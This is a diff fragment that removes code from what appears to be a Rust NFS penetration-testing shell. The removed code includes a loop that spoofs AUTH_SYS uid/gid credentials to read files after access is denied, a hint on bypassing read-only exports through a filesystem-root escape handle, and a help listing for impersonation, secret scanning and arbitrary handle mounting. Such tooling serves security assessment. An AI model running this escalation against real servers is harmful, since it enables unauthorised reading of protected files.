-/// the client asserts can override it within the same export. The only client
-/// route to writing is to reach the underlying filesystem through a *different*
-/// export that is mounted `rw`, which is exactly what an escape handle does.
-fn print_rofs_hint() {
-    eprintln!("{}", "      this export is mounted read-only (ro) on the server. ro is enforced server-side".yellow());
-    eprintln!("{}", "      (RFC 2623 sec. 2.6) -- no AUTH_SYS uid/gid bypasses it within this export.".yellow());
-    eprintln!("{}", "      Bypass: reach the underlying filesystem through a writable export -- run `escape-root`".yellow());
-    eprintln!("{}", "      (or `nfswolf escape` for a handle to feed `shell --handle`), then retry the write there.".yellow());
-}
-
-/// Read the full contents of `fh` with auto-UID escalation on `NFS3ERR_ACCES`.
-///
-/// `read_all` only returns the bytes for the current credential; this wrapper
-/// mirrors the escalation strategy of `read_escalated` (used by `cat`) but
-/// returns the buffer instead of streaming to stdout. Required for the binary
-/// log readers (wtmp/btmp/lastlog) that need the whole file in memory before
-/// the parser can process it. wtmp/btmp are typically gid=43 (`utmp`), so the
-/// escalation list quickly hits a working credential when a wide-open caller
-/// is initially refused.
-async fn read_all_escalated(nfs3: &Nfs3Client, fh: &FileHandle) -> anyhow::Result<Vec<u8>> {
-    match read_all(nfs3, fh).await {
-        Ok(buf) => return Ok(buf),
-        Err(e) if !is_nfs_acces(&e) => return Err(e),
-        Err(_) => {},
-    }
-    let facts = getattr_owner(nfs3, fh).await;
-    let caller = (nfs3.uid(), nfs3.gid());
-    for (uid, gid) in credential_ladder_with(caller, facts.map(|f| f.0), facts.map(|f| f.1), &[]) {
-        let esc = nfs3.with_credential(Credential::Sys(AuthSys::with_groups(uid, gid, &[gid], nfs3.machinename())), uid, gid);
-        match read_all(&esc, fh).await {
-            Ok(buf) => {
-                tracing::debug!(uid, gid, "read_all escalated");
-                return Ok(buf);
-            },
-            Err(e) if !is_nfs_acces(&e) => return Err(e),
-            Err(_) => {},
-        }
-    }
-    anyhow::bail!("NFS3ERR_ACCES: permission denied reading file (no credential in escalation ladder worked)")
-}
-
-/// Like `read_all_escalated`, but also returns the winning (uid, gid) if escalation was needed.
-async fn read_all_escalated_with_winner(nfs3: &Nfs3Client, fh: &FileHandle) -> anyhow::Result<(Vec<u8>, Option<(u32, u32)>)> {
-    match read_all(nfs3, fh).await {
-        Ok(buf) => return Ok((buf, None)),
-        Err(e) if !is_nfs_acces(&e) => return Err(e),
-        Err(_) => {},
-    }
-    let facts = getattr_owner(nfs3, fh).await;
-    let caller = (nfs3.uid(), nfs3.gid());
-    for (uid, gid) in credential_ladder_with(caller, facts.map(|f| f.0), facts.map(|f| f.1), &[]) {
-        let esc = nfs3.with_credential(Credential::Sys(AuthSys::with_groups(uid, gid, &[gid], nfs3.machinename())), uid, gid);
-        match read_all(&esc, fh).await {
-            Ok(buf) => {
-                tracing::debug!(uid, gid, "read_all escalated (cached)");
-                return Ok((buf, Some((uid, gid))));
-            },
-            Err(e) if !is_nfs_acces(&e) => return Err(e),
-            Err(_) => {},
-        }
-    }
-    anyhow::bail!("NFS3ERR_ACCES: permission denied reading file (no credential in escalation ladder worked)")
 }
 
 // =============================================================================
@@ -2830,63 +2429,6 @@ fn fmt_duration(secs: i32) -> String {
     let hours = (secs / 3600) % 24;
     let mins = (secs / 60) % 60;
     if days > 0 { format!("({days}+{hours:02}:{mins:02})") } else { format!("({hours:02}:{mins:02})") }
-}
-
-/// Print the command reference.
-fn print_help() {
-    println!("{}", "NFS shell commands:".bold());
-    println!();
-    println!("{}", "Navigation:".bold().underline());
-    println!("  ls [-a] [--sort=FIELD] [-r] [path]  list directory; -a adds inode/nlink/used/rdev/atime/ctime columns; -r reverses");
-    println!("  cd <path>                  change directory  (/ = export root, /abs = absolute)");
-    println!("  pwd                        print current path");
-    println!("  tree [depth]               recursive tree (default depth 3; hidden dirs always shown)");
-    println!("  find <pattern>             find filenames containing pattern");
-    println!();
-    println!("{}", "File operations:".bold().underline());
-    println!("  cat <file>                 print file contents");
-    println!("  get [-r] <remote> [local | dir/]  download file/tree (auto-UID; dir/ keeps the basename)");
-    println!("  put <local> <remote>       upload file  [--allow-write]");
-    println!("  rm <file>                  remove file  [--allow-write]");
-    println!("  mkdir <dir>                create directory  [--allow-write]");
-    println!("  rmdir <dir>                remove directory  [--allow-write]");
-    println!("  mv <src> <dst>             rename/move  [--allow-write]");
-    println!("  cp <src> <dst>             copy file  [--allow-write]");
-    println!("  symlink <target> <name>    create symlink  [--allow-write]");
-    println!("  readlink <path>            read symlink target");
-    println!();
-    println!("{}", "Attributes:".bold().underline());
-    println!("  stat [path]                show file attributes");
-    println!("  chmod <mode> <path>        set mode (octal)  [--allow-write]");
-    println!("  chown <uid>[:<gid>] <path> set owner  [--allow-write]");
-    println!();
-    println!("{}", "Identity  (AUTH_SYS is client-asserted, RFC 5531 sec. 14):".bold().underline());
-    println!("  whoami                     show current uid:gid");
-    println!("  uid <n>                    switch UID");
-    println!("  gid <n>                    switch GID");
-    println!("  impersonate <uid>:<gid>    switch both");
-    println!();
-    println!("{}", "Devices:".bold().underline());
-    println!("  mknod <name> c|b <maj> <min>  create device node  [--allow-write]");
-    println!();
-    println!("{}", "Analysis:".bold().underline());
-    println!("  suid-scan                  find SUID/SGID binaries");
-    println!("  world-writable             find world-writable files");
-    println!("  secrets-scan               find credential/secret files");
-    println!("  last [N]                   decode /var/log/wtmp (login history; per util-linux 2.42 last.c)");
-    println!("  lastb [N]                  decode /var/log/btmp (failed-login history)");
-    println!("  lastlog                    decode /var/log/lastlog (last login per UID)");
-    println!();
-    println!("{}", "Escape (F-2.1 -- construct filesystem root handle):".bold().underline());
-    println!("  escape-root                build and switch to FS root handle");
-    println!("  mount-handle <hex>         jump to arbitrary file handle");
-    println!("  handle                     print current dir handle (hex)");
-    println!();
-    println!("{}", "Local:".bold().underline());
-    println!("  lcd [dir]   lls [dir]   lpwd   lmkdir <dir>");
-    println!();
-    println!("{}", "Session:".bold().underline());
-    println!("  history     help     exit");
 }
 
 #[cfg(test)]
